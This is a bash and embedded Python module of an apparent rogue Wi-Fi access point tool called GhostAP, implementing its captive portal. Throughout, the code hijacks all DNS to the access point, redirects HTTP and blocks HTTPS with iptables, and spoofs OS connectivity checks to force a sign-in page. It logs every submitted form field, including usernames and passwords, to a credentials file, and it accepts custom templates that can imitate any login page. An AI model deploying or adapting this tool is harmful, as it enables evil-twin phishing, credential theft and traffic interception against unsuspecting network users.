#!/bin/bash

# Captive portal server script written to TMP_DIR and executed as a background process.
# The server serves the portal page, handles POST /accept to whitelist clients via
# iptables, and serves any static assets bundled alongside the template.

_captive_write_server() {
    local server_script="${TMP_DIR}/captive_server.py"

    cat > "${server_script}" << 'PYEOF'
#!/usr/bin/env python3
import sys, os, mimetypes, subprocess, threading
from datetime import datetime
from urllib.parse import parse_qs, unquote_plus
from http.server import BaseHTTPRequestHandler, HTTPServer

PORT      = int(sys.argv[1])
ROOT      = sys.argv[2]
IFACE     = sys.argv[3]
CREDS_OUT = sys.argv[4]   # absolute path to the credentials output file
REAL_DNS  = sys.argv[5]   # upstream DNS to restore for whitelisted clients

# Windows NCSI probes — must return exact bodies so Windows marks "internet available"
# Key: path suffix (matched against any Host). Value: (status, body).
NCSI_RESPONSES = {
    '/connecttest.txt': (200, b'Microsoft Connect Test'),   # msftconnecttest.com
    '/ncsi.txt':        (200, b'Microsoft NCSI'),           # msftncsi.com
    '/generate_204':    (204, b''),                         # Android / Chrome
    '/success.txt':     (200, b'success'),                  # Firefox
    '/canonical.html':  (200, b''),                         # Ubuntu
}

# Captive portal detection paths that should trigger the browser CNA dialog
# (redirect to portal page so the OS pops up "Sign in to network")
REDIRECT_DETECT_PATHS = {
    '/hotspot-detect.html',  # iOS / macOS
    '/redirect',             # Windows — used as the "portal success" redirect target
}

_write_lock = threading.Lock()

# In-memory whitelist: ip -> {'time': datetime, 'fields': dict}
# Persists for the lifetime of the portal server process only.
# Cleared on GhostAP stop/restart — not persisted to disk.
_whitelist = {}

def is_whitelisted(ip):
    return ip in _whitelist

def whitelist_client(ip, fields):
    """Unblock a client fully:
    1. Bypass the HTTP portal redirect (nat PREROUTING ACCEPT at top).
    2. Bypass the HTTPS TCP-reset in FORWARD.
    3. DNAT the client's DNS queries to the real upstream server so that
       dnsmasq's wildcard address=/#/... no longer poisons their lookups.
    All rules are inserted at position 1 so they take priority over
    every rule added during startup. Skips iptables if IP already whitelisted.
    """
    with _write_lock:
        already = ip in _whitelist
        _whitelist[ip] = {'time': datetime.now(), 'fields': fields}

    if already:
        return  # iptables rules already in place — skip duplicate insertion

    # Stop HTTP redirect and HTTPS TCP-reset for this client
    subprocess.call([
        'iptables', '-t', 'nat', '-I', 'PREROUTING', '1',
        '-i', IFACE, '-s', ip, '-j', 'ACCEPT'
    ])
    subprocess.call([
        'iptables', '-I', 'FORWARD', '1',
        '-i', IFACE, '-s', ip, '-j', 'ACCEPT'
    ])
    # Redirect this client's DNS to the real upstream, bypassing dnsmasq wildcard
    for proto in ('udp', 'tcp'):
        subprocess.call([
            'iptables', '-t', 'nat', '-I', 'PREROUTING', '1',
            '-i', IFACE, '-s', ip,
            '-p', proto, '--dport', '53',
            '-j', 'DNAT', '--to-destination', '{}:53'.format(REAL_DNS)
        ])

def save_credentials(ip, fields):
    """Append one submission block to the credentials file.

    Format (human-readable, trivially parseable):
        [2024-01-15 14:32:01] 192.168.10.42
          username : admin
          password : hunter2
        ---
    Empty-value fields are still recorded so the template structure is visible.
    """
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    lines = ["[{}] {}\n".format(timestamp, ip)]
    for key, values in fields.items():
        # parse_qs returns lists; join multiple values with ', '
        value = ", ".join(values)
        lines.append("  {} : {}\n".format(key, value))
    lines.append("---\n")

    with _write_lock:
        with open(CREDS_OUT, 'a') as f:
            f.writelines(lines)

class PortalHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass  # Suppress access log; GhostAP handles its own logging

    def client_ip(self):
        return self.client_address[0]

    # ── GET ───────────────────────────────────────────────────────────────────
    def do_GET(self):
        path = self.path.split('?')[0]
        ip   = self.client_ip()

        if is_whitelisted(ip):
            # ── Whitelisted client ────────────────────────────────────────────
            # Serve real NCSI responses so the OS clears its "no internet" state
            # and stops showing the captive portal notification.
            if path in NCSI_RESPONSES:
                status, body = NCSI_RESPONSES[path]
                self.send_response(status)
                self.send_header('Content-Type', 'text/plain')
                self.send_header('Content-Length', str(len(body)))
                self.end_headers()
                self.wfile.write(body)
                return
            # /redirect: Windows navigates here to confirm internet is live
            if path in REDIRECT_DETECT_PATHS:
                self.send_response(302)
                self.send_header('Location', 'http://google.com')
                self.end_headers()
                return
        else:
            # ── Unwhitelisted client ──────────────────────────────────────────
            # All probe paths (NCSI + CNA) must redirect to the portal so the
            # OS shows "Sign in to network" and does NOT cache "internet OK".
            if path in NCSI_RESPONSES or path in REDIRECT_DETECT_PATHS:
                self.send_response(302)
                self.send_header('Location', 'http://captive.portal/')
                self.end_headers()
                return

        rel = path.lstrip('/')
        if rel in ('', 'index.html'):
            self._serve_file('index.html')
        elif rel == 'accept':
            self._serve_file('accept.html')
        else:
            self._serve_static(rel)

    # ── POST ──────────────────────────────────────────────────────────────────
    def do_POST(self):
        if self.path != '/accept':
            self.send_response(404)
            self.end_headers()
            return

        # Read and decode the POST body
        length = int(self.headers.get('Content-Length', 0))
        raw_body = self.rfile.read(length).decode('utf-8', errors='replace') if length else ''

        content_type = self.headers.get('Content-Type', '')

        if 'application/x-www-form-urlencoded' in content_type:
            fields = parse_qs(raw_body, keep_blank_values=True)
        elif 'multipart/form-data' in content_type:
            # Lightweight multipart parser — covers text fields only
            fields = _parse_multipart(content_type, raw_body)
        elif 'application/json' in content_type:
            # Parse JSON body — wrap scalar values in lists to match parse_qs shape
            import json as _json
            try:
                obj = _json.loads(raw_body) if raw_body else {}
                fields = {k: [str(v)] for k, v in obj.items()} if isinstance(obj, dict) else {}
            except ValueError:
                fields = {}
        else:
            # Fallback: try URL-decode anyway
            fields = parse_qs(raw_body, keep_blank_values=True)

        ip = self.client_ip()

        # Always save credentials — even repeat submissions (e.g. back button)
        save_credentials(ip, fields)

        # Whitelist client — no-op for iptables if already whitelisted,
        # but updates the in-memory record with latest submitted fields
        whitelist_client(ip, fields)
        self._serve_file('accept.html')

    # ── helpers ───────────────────────────────────────────────────────────────
    def _serve_file(self, filename):
        filepath = os.path.join(ROOT, filename)
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            mime, _ = mimetypes.guess_type(filename)
            self.send_response(200)
            self.send_header('Content-Type', mime or 'text/html; charset=utf-8')
            self.send_header('Content-Length', str(len(data)))
            self.end_headers()
            self.wfile.write(data)
        except FileNotFoundError:
            self.send_response(404)
            self.end_headers()

    def _serve_static(self, rel_path):
        safe = os.path.normpath(os.path.join(ROOT, rel_path))
        if not safe.startswith(ROOT):
            self.send_response(403)
            self.end_headers()
            return
        if os.path.isfile(safe):
            self._serve_file(rel_path)
        else:
            self.send_response(404)
            self.end_headers()


def _parse_multipart(content_type, body):
    """Extract text fields from a multipart/form-data body.
    Returns a dict[str, list[str]] matching parse_qs output shape.
    """
    import re
    boundary_match = re.search(r'boundary=([^\s;]+)', content_type)
    if not boundary_match:
        return {}
    boundary = '--' + boundary_match.group(1)
    fields = {}
    for part in body.split(boundary):
        if 'Content-Disposition' not in part:
            continue
        header_end = part.find('\r\n\r\n')
        if header_end == -1:
            header_end = part.find('\n\n')
            sep = '\n\n'
        else:
            sep = '\r\n\r\n'
        headers_raw = part[:header_end]
        value = part[header_end + len(sep):].rstrip('\r\n--')
        name_match = re.search(r'name="([^"]+)"', headers_raw)
        if name_match and 'filename=' not in headers_raw:
            key = name_match.group(1)
            fields.setdefault(key, []).append(unquote_plus(value))
    return fields


HTTPServer(('0.0.0.0', PORT), PortalHandler).serve_forever()
PYEOF

    chmod +x "${server_script}"
}

_captive_build_portal_dir() {
    local portal_dir="${TMP_DIR}/captive_portal"
    mkdir -p "${portal_dir}"

    # ── index.html ────────────────────────────────────────────────────────────
    if [[ -n "${DEFAULTS[CAPTIVE_TEMPLATE]}" ]]; then
        log "Captive portal: using custom template: ${DEFAULTS[CAPTIVE_TEMPLATE]}"

        # Copy the entire template directory so any folder structure and file
        # type is preserved (static/, public/, vendor/, fonts/, etc.)
        local tmpl_dir
        tmpl_dir="$(dirname "${DEFAULTS[CAPTIVE_TEMPLATE]}")"
        cp -r "${tmpl_dir}/." "${portal_dir}/"

        # The entry point must always be served as index.html — rename if needed
        local tmpl_basename
        tmpl_basename="$(basename "${DEFAULTS[CAPTIVE_TEMPLATE]}")"
        if [[ "${tmpl_basename}" != "index.html" ]]; then
            mv "${portal_dir}/${tmpl_basename}" "${portal_dir}/index.html"
            debug "Captive portal: renamed '${tmpl_basename}' to 'index.html'"
        fi

        debug "Captive portal: copied template directory '${tmpl_dir}/'"
    else
        debug "Captive portal: no template provided, using built-in default"
        cat > "${portal_dir}/index.html" << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Network Access</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      background: #1a1a2e;
      display: flex; align-items: center; justify-content: center;
      min-height: 100vh; color: #eee;
    }
    .card {
      background: #16213e; border: 1px solid #0f3460;
      border-radius: 12px; padding: 40px 32px;
      max-width: 420px; width: 90%; text-align: center;
      box-shadow: 0 8px 32px rgba(0,0,0,.4);
    }
    .logo { font-size: 48px; margin-bottom: 16px; }
    h1   { font-size: 22px; margin-bottom: 8px; }
    p    { font-size: 14px; color: #aaa; margin-bottom: 28px; }
    button {
      background: #e94560; color: #fff; border: none;
      border-radius: 8px; padding: 14px 40px;
      font-size: 16px; cursor: pointer; width: 100%;
      transition: background .2s;
    }
    button:hover { background: #c73652; }
    .terms { font-size: 12px; color: #666; margin-top: 20px; }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">📡</div>
    <h1>Welcome to GhostAP</h1>
    <p>Click below to accept the terms and access the internet.</p>
    <form action="/accept" method="POST">
      <button type="submit">Connect to Internet</button>
    </form>
    <p class="terms">This network is monitored. Unauthorized use is prohibited.</p>
  </div>
</body>
</html>
EOF
    fi

    # ── accept.html — always generated, not user-customisable ─────────────────
    cat > "${portal_dir}/accept.html" << 'EOF'
<!DOCTYPE html>
<html>
<head>
  <title>Connected</title>
  <meta http-equiv="refresh" content="2;url=http://www.msftconnecttest.com/redirect">
  <style>
    body { font-family: sans-serif; background: #1a1a2e; color: #eee;
           display: flex; align-items: center; justify-content: center; height: 100vh; }
    .msg { text-align: center; }
    .icon { font-size: 64px; }
  </style>
</head>
<body>
  <div class="msg">
    <div class="icon">✅</div>
    <h2>You're connected!</h2>
    <p>Redirecting you to the internet…</p>
  </div>
</body>
</html>
EOF

    echo "${portal_dir}"
}

_captive_validate_template() {
    local tmpl="${DEFAULTS[CAPTIVE_TEMPLATE]}"
    [[ -z "${tmpl}" ]] && return 0

    if [[ ! -f "${tmpl}" ]]; then
        warn "Captive portal template not found: ${tmpl}. Skipping captive portal."
        DEFAULTS[CAPTIVE_PORTAL]=false
        return 1
    fi

    local ext="${tmpl##*.}"
    if [[ "${ext}" != "html" && "${ext}" != "htm" ]]; then
        warn "Captive portal template '${tmpl}' does not have an .html/.htm extension — using it anyway."
    fi

    # Accept both HTML form action="/accept" and JS fetch('/accept') patterns
    if ! grep -qiE '(action\s*=\s*["\x27]/accept|fetch\s*\(\s*["\x27]/accept)' "${tmpl}" 2>/dev/null; then
        warn "Captive portal template may be missing <form action=\"/accept\" method=\"POST\"> or fetch('/accept')."
        warn "Without posting to /accept the connect button will not whitelist the client."
    fi

    return 0
}

configure_captive_portal() {
    if [[ "${INTERACTIVE_MODE}" == true ]]; then
        if [[ -z "${ARG[CAPTIVE_PORTAL]}" ]]; then
            read -r -p "Enable captive portal? (y/N): " enable_captive
            if [[ "${enable_captive}" =~ ^[Yy]$ ]]; then
                DEFAULTS[CAPTIVE_PORTAL]=true
            elif [[ "${enable_captive}" =~ ^[Nn]$ ]]; then
                DEFAULTS[CAPTIVE_PORTAL]=false
            fi
        fi
    fi

    [[ "${DEFAULTS[CAPTIVE_PORTAL]}" == true ]] || return 0

    # ── dependency check ──────────────────────────────────────────────────────
    if ! command -v python3 >/dev/null; then
        warn "python3 not found. Captive portal requires python3. Skipping captive portal."
        DEFAULTS[CAPTIVE_PORTAL]=false
        return 1
    fi

    # ── interactive prompts ───────────────────────────────────────────────────
    if [[ "${INTERACTIVE_MODE}" == true ]]; then
        if [[ -z "${ARG[CAPTIVE_PORT]}" ]]; then
            while true; do
                read -r -p "Captive portal port [${DEFAULTS[CAPTIVE_PORT]}]: " user_input
                local port="${user_input:-${DEFAULTS[CAPTIVE_PORT]}}"
                if validate_port "${port}"; then
                    DEFAULTS[CAPTIVE_PORT]="${port}"
                    break
                else
                    echo "Invalid port. Please enter a value between 1 and 65535."
                fi
            done
        fi

        if [[ -z "${ARG[CAPTIVE_TEMPLATE]}" ]]; then
            read -r -p "Path to custom HTML template (leave empty for built-in): " user_input
            if [[ -n "${user_input}" ]]; then
                DEFAULTS[CAPTIVE_TEMPLATE]="${user_input}"
                ARG[CAPTIVE_TEMPLATE]=1
            fi
        fi
    fi

    # ── conflict checks ───────────────────────────────────────────────────────
    if [[ "${DEFAULTS[DNS_SPOOFING]}" == true ]]; then
        warn "Captive portal and DNS spoofing both hijack DNS — DNS spoofing entries may interfere."
        warn "The captive portal wildcard (address=/#/...) will override per-domain spoof rules."
    fi

    if [[ "${DEFAULTS[PROXY_ENABLED]}" == true ]]; then
        warn "Captive portal and proxy routing both redirect HTTP traffic."
        warn "They may conflict. Consider using only one at a time."
    fi

    # ── validate template ─────────────────────────────────────────────────────
    _captive_validate_template || return 1

    log "Configuring captive portal on port ${DEFAULTS[CAPTIVE_PORT]}..."

    # ── build portal file tree ────────────────────────────────────────────────
    local portal_dir
    portal_dir=$(_captive_build_portal_dir)

    # ── DNS: wildcard hijack appended to dnsmasq config ───────────────────────
    # address=/#/... must come after configure_dhcp() has written the base config.
    local ap_ip="192.168.${DEFAULTS[SUBNET]}.1"
    {
        echo ""
        echo "# Captive portal: redirect all DNS queries to the AP"
        echo "address=/#/${ap_ip}"
        echo "address=/captive.portal/${ap_ip}"
    } >> "${DNSMASQ_CONF}"

    # ── iptables: redirect unwhitelisted HTTP; block HTTPS until accepted ─────
    local port="${DEFAULTS[CAPTIVE_PORT]}"
    IPTABLES_RULES+=(
        "iptables -t nat -I PREROUTING -i ${DEFAULTS[INTERFACE]} -p tcp --dport 80 -j REDIRECT --to-port ${port}"
        "iptables -I FORWARD -i ${DEFAULTS[INTERFACE]} -p tcp --dport 443 -j REJECT --reject-with tcp-reset"
    )

    # ── portal server ─────────────────────────────────────────────────────────
    _captive_write_server

    local server_script="${TMP_DIR}/captive_server.py"
    local server_log="${LOG_DIR}/captive.log"
    local creds_file="${OUT_DIR}/captive_credentials-$(date +%Y%m%d-%H%M%S).txt"

    python3 "${server_script}" "${port}" "${portal_dir}" "${DEFAULTS[INTERFACE]}" "${creds_file}" "${DEFAULTS[DNS]}" \
        >> "${server_log}" 2>&1 &
    local captive_pid=$!

    sleep 1
    if ! kill -0 "${captive_pid}" 2>/dev/null; then
        warn "Captive portal server failed to start. Check ${server_log}"
        DEFAULTS[CAPTIVE_PORTAL]=false
        return 1
    fi

    PIDS+=("${captive_pid}")
    log "Captive portal server started (PID: ${captive_pid}, port: ${port})"
    log "Captive portal credentials will be saved to: ${creds_file}"

    [[ -n "${DEFAULTS[CAPTIVE_TEMPLATE]}" ]] && \
        log "Captive portal template: ${DEFAULTS[CAPTIVE_TEMPLATE]}"

    return 0
}